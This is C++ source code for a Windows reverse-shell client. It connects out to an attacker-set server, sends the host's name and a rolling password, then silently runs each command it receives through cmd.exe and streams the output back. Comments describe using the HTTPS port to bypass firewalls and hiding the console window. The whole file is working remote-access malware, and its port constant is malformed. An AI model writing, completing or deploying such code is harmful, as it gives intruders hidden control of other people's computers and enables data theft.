#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <string>
#include <time.h>
#include <stdlib.h>
#include <stdio.h>


#define RED "\033[31m"
#define GREEN "\033[32m"
#define YELLOW "\033[33m"
#define RESET "\033[0m"

//Change This with You current Server Ip
#define SERVER_IP "IP_PLACEHOLDER"  
#define PORT 10293847576

void active_ansi()
{
    HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
    DWORD dwMode = 0;
    GetConsoleMode(hOut, &dwMode);
    if (!SetConsoleMode(hOut, dwMode | ENABLE_VIRTUAL_TERMINAL_PROCESSING))
    {
        printf("ANSI not supported\n");
    }
    return ;
}

static void exec_cmd_and_send(SOCKET sock, char *cmd)
{
    HANDLE hRead, hWrite;
    SECURITY_ATTRIBUTES sa;
    PROCESS_INFORMATION pi;
    STARTUPINFO si;
    char buffer[1024];
    DWORD bytesRead;

    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle = TRUE;

    if (!CreatePipe(&hRead, &hWrite, &sa, 0))
        return;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hWrite;
    si.hStdError = hWrite;

    ZeroMemory(&pi, sizeof(pi));

    std::string command = "cmd.exe /c ";
    command += cmd;

    if (!CreateProcess(
        NULL,
        (LPSTR)command.c_str(),
        NULL,
        NULL,
        TRUE,
        CREATE_NO_WINDOW,
        NULL,
        NULL,
        &si,
        &pi))
    {
        CloseHandle(hRead);
        CloseHandle(hWrite);
        return;
    }

    CloseHandle(hWrite);

    while (ReadFile(hRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0)
    {
        buffer[bytesRead] = '\0';
        send(sock, buffer, bytesRead, 0);
    }

    send(sock, "[END]\n", 6, 0);

    CloseHandle(hRead);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

static void send_hostname(SOCKET sock)
{
    char hostname[256];

    if (gethostname(hostname, sizeof(hostname)) == 0)
    {
        char msg[300];
        snprintf(msg, sizeof(msg), "[HOST]%s\n", hostname);
        Sleep(1000);
        send(sock, msg, strlen(msg), 0);
    }
}

std::string get_password()
{
    std::string password = "dF8#kL2@xQ9!pW7zT4$eR6uM1&bY";
    password += std::to_string(time(NULL) / 30);
    return password;
}

static void send_pass(SOCKET sock, std::string password)
{
    std::string pass = "[AUTH]" + password + "\n";
    Sleep(1000);
    send(sock, pass.c_str(), pass.size(), 0);
}

//taskkill /IM client_no_console.exe /F

int main()
{
    WORD wVersionRequested;
    WSADATA wsaData;
    int err;
    active_ansi();

    // permet de choisir la version
    wVersionRequested = MAKEWORD(2, 2);

    err = WSAStartup(wVersionRequested,&wsaData);
    if (err != 0)
    {
        printf("[-] WSAStartup failed\n");
        return (0);
    }
    printf("[+] Winsock initialized\n");
    
    int af = AF_INET; // IPV4
    int type = SOCK_STREAM; // TCP
    int protocol = 0; // Auto mais ducoup sa choisir TCP
    SOCKET sock;
    sock = socket(af, type, protocol);
    if (sock == INVALID_SOCKET)
    {
        printf("[-] socket failed\n");
        return (1);
    }
    printf("[+] Socket initialized\n");

    struct sockaddr_in saServer;
    saServer.sin_family = AF_INET;
    saServer.sin_addr.s_addr = inet_addr(SERVER_IP);
    saServer.sin_port = htons((int)PORT); // port HTTPS pour bypass firewall
    if (connect(sock, (struct sockaddr*)&saServer, sizeof(saServer)) == SOCKET_ERROR)
    {
        printf(RED "[-] connect failed\n" RESET);
        Sleep(1000);
        return (1);
    }
    printf("[+] Connect initialized!\n");
    send_pass(sock, get_password());
    send_hostname(sock);
    printf(GREEN "[+] Connected to server!\n" RESET);
    char buffer[1024];
    while (true)
    {
        int bytes = recv(sock, buffer, sizeof(buffer) - 1, 0);
        if (bytes <= 0)
        {
            printf("[-] Recv Failed\n");
            break;
        }
        else
        {
            buffer[bytes] = '\0';
            exec_cmd_and_send(sock, buffer);
        }
    }
    closesocket(sock);
    WSACleanup();
    return (0);
}